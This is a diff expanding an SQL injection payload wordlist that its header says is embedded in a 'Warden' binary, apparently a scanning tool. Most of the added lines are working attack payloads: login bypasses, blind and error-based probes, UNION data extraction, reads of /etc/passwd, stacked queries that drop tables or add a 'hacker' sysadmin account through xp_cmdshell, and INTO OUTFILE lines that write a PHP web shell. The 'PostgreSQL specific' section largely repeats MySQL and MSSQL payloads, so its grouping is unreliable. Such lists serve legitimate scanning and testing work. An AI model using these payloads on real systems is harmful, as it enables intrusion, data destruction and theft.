@@ -1,14 +1,256 @@
 # SQL injection payload wordlist
 # Embedded in Warden binary
 
+# Basic authentication bypass
 ' OR '1'='1
 " OR "1"="1
 ' OR 1=1--
 " OR 1=1--
-' UNION SELECT NULL--
-" UNION SELECT NULL--
 ' OR 1=1#
 " OR 1=1#
 admin'--
 " or "1"="1
 ') OR '1'='1'--
+') OR ('1'='1'--
+" OR "1"="1"--
+' OR '1'='1'#
+' OR 1=1 LIMIT 1--
+' OR 1=1 ORDER BY 1--
+' OR 1=1 UNION SELECT NULL--
+admin' OR '1'='1
+admin'--
+admin'#
+admin'/*
+' OR 1=1--
+' OR '1'='1'--
+' OR '1'='1'/*
+' OR '1'='1'#
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1--
+') or ('1'='1'--
+') or ('1'='1')--
+') or ('1'='1')#
+") or ("1"="1"
+") or ("1"="1"#
+") or ("1"="1")--
+
+# Time-based blind SQLi
+' AND SLEEP(5)--
+" AND SLEEP(5)--
+' AND SLEEP(5)#
+' AND SLEEP(10)--
+' AND WAITFOR DELAY '00:00:05'--
+' AND BENCHMARK(50000000,MD5(1))--
+' AND BENCHMARK(20000000,SHA1(1))--
+' AND pg_sleep(5)--
+' AND dbms_pipe.receive_message('a',5)--
+' OR SLEEP(5)--
+" OR SLEEP(5)--
+') AND SLEEP(5)--
+') OR SLEEP(5)--
+1; WAITFOR DELAY '00:00:05'--
+1); WAITFOR DELAY '00:00:05'--
+1); SELECT pg_sleep(5)--
+1' AND (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)>0 AND 1='1
+1' AND (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3)>0 AND 1='1
+1' AND 999=999; EXEC xp_cmdshell 'ping 127.0.0.1'--
+
+# Error-based SQLi
+' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
+' AND 1=CAST((SELECT TOP 1 table_name FROM information_schema.tables) AS int)--
+' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--
+' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--
+' AND 1 IN (SELECT * FROM OBTAIN_SLOW_LOG())--
+' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)--
+' OR 1 GROUP BY concat(database(),FLOOR(RAND(0)*2)) HAVING MIN(1)--
+1 procedure analyse(extractvalue(1,concat(0x7e,database())),1)--
+(SELECT 1 FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--
+
+# UNION-based SQLi
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10--
+' UNION SELECT 1,database(),3,4,5,6,7,8,9,10--
+' UNION SELECT NULL,version(),NULL--
+' UNION SELECT NULL,user(),NULL--
+' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
+' UNION SELECT NULL,column_name,NULL FROM information_schema.columns--
+' UNION SELECT NULL,table_schema,NULL FROM information_schema.tables--
+' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables--
+' UNION SELECT NULL,table_name,column_name,NULL FROM information_schema.columns--
+" UNION SELECT NULL,NULL--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL--
+' UNION SELECT 1,@@version--
+' UNION SELECT 1,@@version,3--
+' UNION SELECT 1,database(),user(),4--
+' UNION SELECT 1,load_file('/etc/passwd'),3,4--
+' UNION SELECT 1,load_file('C:/Windows/win.ini'),3,4--
+' UNION SELECT NULL FROM information_schema.tables--
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT table_schema,table_name FROM information_schema.tables--
+
+# Stacked queries
+' ; DROP TABLE test--
+' ; DROP DATABASE test--
+' ; EXEC xp_cmdshell 'dir'--
+' ; SELECT * FROM information_schema.tables--
+' OR 1=1; DROP TABLE users--
+' ; INSERT INTO users VALUES(1,'hacker','password')--
+' ; UPDATE users SET password='hacked' WHERE id=1--
+1; DELETE FROM users WHERE 1=1--
+1' ; EXEC master..xp_cmdshell 'ping 127.0.0.1'--
+1' ; EXEC master.dbo.xp_cmdshell 'dir'--
+' OR 1=1; EXEC xp_cmdshell 'net user hacker password /ADD'--
+
+# Boolean-based blind
+' AND 1=1--
+' AND 1=2--
+' AND 1=1#
+' AND 1=2#
+" AND 1=1--
+" AND 1=2--
+') AND 1=1--
+') AND 1=2--
+') AND 1=1#
+') AND 1=2#
+') AND ('1'='1'--
+') AND ('1'='2'--
+' AND 2>1--
+' AND 3>2--
+' AND 4<5--
+' AND 5=5--
+' AND 5!=4--
+
+# Second-order SQLi
+' OR (SELECT COUNT(*) FROM information_schema.tables)>0--
+' OR (SELECT COUNT(*) FROM users)>0--
+'; INSERT INTO logs (message) VALUES ('test')--
+' OR (SELECT 1 FROM users LIMIT 1)=1--
+' OR (SELECT database()) IS NOT NULL--
+'; DROP TABLE logs;--
+
+# MySQL specific
+' OR 1=1-- -
+' OR 1=1#
+" OR 1=1-- -
+" OR 1=1#
+' OR 1=1;%00
+' OR 1=1 LIMIT 1--
+' OR 1=1 LIMIT 1,0--
+' OR 1=1 ORDER BY 1--
+' OR 1=1 UNION SELECT NULL--
+' UNION SELECT @@version--
+' UNION SELECT SLEEP(5)--
+' UNION SELECT BENCHMARK(50000000,MD5(1))--
+' OR 1=1 INTO OUTFILE '/var/www/html/shell.php'--
+' OR 1=1 INTO DUMPFILE '/var/www/html/shell.php'--
+' UNION SELECT '<?php system($_GET["c"]);?>',2,3 INTO OUTFILE '/var/www/html/shell.php'--
+' UNION SELECT 0x3c3f7068702073797374656428245f4745545b2263225d293b3f3e INTO OUTFILE '/var/www/html/shell.php'--
+
+# MSSQL specific
+' OR 1=1--
+' OR 1=1--
+sp_password
+' OR 1=1; EXEC xp_cmdshell 'dir'--
+' OR 1=1; EXEC master..xp_cmdshell 'dir'--
+'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--
+' UNION SELECT @@version--
+' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
+' AND 1=CAST((SELECT TOP 1 table_name FROM information_schema.tables) AS int)--
+'; EXEC sp_adduser 'hacker','password'--
+'; EXEC sp_addsrvrolemember 'hacker','sysadmin'--
+
+# PostgreSQL specific
+' OR 1=1--
+' OR 1=1--
+' OR 1=1;--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10--
+' UNION SELECT 1,database(),3,4,5,6,7,8,9,10--
+' UNION SELECT NULL,version(),NULL--
+' UNION SELECT NULL,user(),NULL--
+' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
+' UNION SELECT NULL,column_name,NULL FROM information_schema.columns--
+' UNION SELECT NULL,table_schema,NULL FROM information_schema.tables--
+' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables--
+' UNION SELECT NULL,table_name,column_name,NULL FROM information_schema.columns--
+" UNION SELECT NULL,NULL--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL--
+' UNION SELECT 1,@@version--
+' UNION SELECT 1,@@version,3--
+' UNION SELECT 1,database(),user(),4--
+' UNION SELECT 1,load_file('/etc/passwd'),3,4--
+' UNION SELECT 1,load_file('C:/Windows/win.ini'),3,4--
+' UNION SELECT NULL FROM information_schema.tables--
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT table_schema,table_name FROM information_schema.tables--
+1; DELETE FROM users WHERE 1=1--
+1' ; EXEC master..xp_cmdshell 'ping 127.0.0.1'--
+1' ; EXEC master.dbo.xp_cmdshell 'dir'--
+' OR 1=1; EXEC xp_cmdshell 'net user hacker password /ADD'--
+' OR (SELECT COUNT(*) FROM information_schema.tables)>0--
+' OR (SELECT COUNT(*) FROM users)>0--
+'; INSERT INTO logs (message) VALUES ('test')--
+' OR (SELECT 1 FROM users LIMIT 1)=1--
+' OR (SELECT database()) IS NOT NULL--
+'; DROP TABLE logs;--
+' OR 1=1-- -
+' OR 1=1#
+" OR 1=1-- -
+" OR 1=1#
+' OR 1=1;%00
+' OR 1=1 LIMIT 1--
+' OR 1=1 LIMIT 1,0--
+' OR 1=1 ORDER BY 1--
+' OR 1=1 UNION SELECT NULL--
+' UNION SELECT @@version--
+' UNION SELECT SLEEP(5)--
+' UNION SELECT BENCHMARK(50000000,MD5(1))--
+' OR 1=1 INTO OUTFILE '/var/www/html/shell.php'--
+' OR 1=1 INTO DUMPFILE '/var/www/html/shell.php'--
+' UNION SELECT '<?php system($_GET["c"]);?>',2,3 INTO OUTFILE '/var/www/html/shell.php'--
+' UNION SELECT 0x3c3f7068702073797374656428245f4745545b2263225d293b3f3e INTO OUTFILE '/var/www/html/shell.php'--
+' OR 1=1--
+' OR 1=1--
+sp_password
+' OR 1=1; EXEC xp_cmdshell 'dir'--
+' OR 1=1; EXEC master..xp_cmdshell 'dir'--
+'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--
+' UNION SELECT @@version--
+' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
+' AND 1=CAST((SELECT TOP 1 table_name FROM information_schema.tables) AS int)--
+'; EXEC sp_adduser 'hacker','password'--
+'; EXEC sp_addsrvrolemember 'hacker','sysadmin'--
+' OR 1=1--
+' OR 1=1--
+' OR 1=1;--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT pg_sleep(5)--
+' ; DROP TABLE test--
+' ; SELECT pg_sleep(5)--
+' ; COPY users TO '/tmp/users.txt'--
+
+# Oracle specific
+' OR 1=1--
+' OR '1'='1'--
+' UNION SELECT NULL FROM DUAL--
+' UNION SELECT table_name FROM all_tables--
+' UNION SELECT column_name FROM all_tab_columns--
+' AND 1=CAST((SELECT banner FROM v$version WHERE ROWNUM=1) AS INT)--
+' AND 1=ctxsys.drithsx.sn(user,(SELECT banner FROM v$version WHERE ROWNUM=1))--
+' OR 1=1; EXEC DBMS_LOCK.SLEEP(5)--
+' OR 1=1; BEGIN DBMS_LOCK.SLEEP(5); END--
